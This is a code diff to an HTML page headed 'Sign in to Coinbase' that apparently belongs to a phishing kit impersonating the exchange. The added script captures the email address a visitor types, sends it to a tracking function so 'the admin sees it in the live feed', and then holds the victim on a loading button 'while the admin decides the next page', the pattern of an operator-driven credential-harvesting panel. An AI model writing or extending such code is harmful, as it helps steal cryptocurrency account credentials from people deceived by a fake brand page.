@@ -19,9 +19,9 @@
 
     <h1>Sign in to Coinbase</h1>
 
-    <input type="email" placeholder="Enter your email"/>
+    <input id="email" name="email" type="email" placeholder="Enter your email" autocomplete="email"/>
 
-    <button class="primary">Continue</button>
+    <button id="continueBtn" class="primary" type="button" disabled aria-disabled="true">Continue</button>
 
     <div class="divider">
       <span></span>
@@ -42,7 +42,7 @@
     </button>
 
     <p class="signup">
-      Don’t have an account? <a href="#">Sign up</a>
+      Don't have an account? <a href="#">Sign up</a>
     </p>
 
   </div>
@@ -52,6 +52,48 @@
     See our <a href="#">Cookie Policy</a> and <a href="#">Privacy Policy</a>
     for more information on how we process your personal data.
   </div>
+
+  <script>
+    (function () {
+      var input = document.getElementById('email');
+      var btn = document.getElementById('continueBtn');
+
+      function isValid(v) {
+        // Enable once the user has typed an @ symbol with something around it.
+        return /.+@.+/.test(v || '');
+      }
+
+      function sync() {
+        var ok = isValid(input.value);
+        btn.disabled = !ok;
+        btn.setAttribute('aria-disabled', ok ? 'false' : 'true');
+        btn.classList.toggle('is-ready', ok);
+      }
+
+      input.addEventListener('input', sync);
+      sync();
+
+      btn.addEventListener('click', function () {
+        if (btn.disabled) return;
+        var email = input.value.trim();
+        // Record the submission so the admin sees it in the live feed.
+        try { window.track && window.track('email_submitted', email); } catch (e) {}
+        try { window.track && window.track('continue_clicked', '1'); } catch (e) {}
+        // Visual feedback while the admin decides the next page.
+        btn.disabled = true;
+        btn.classList.add('is-loading');
+        btn.textContent = 'Continuing…';
+      });
+
+      // Submit on Enter inside the email field.
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter' && !btn.disabled) {
+          e.preventDefault();
+          btn.click();
+        }
+      });
+    })();
+  </script>
 
 </body>
 </html>
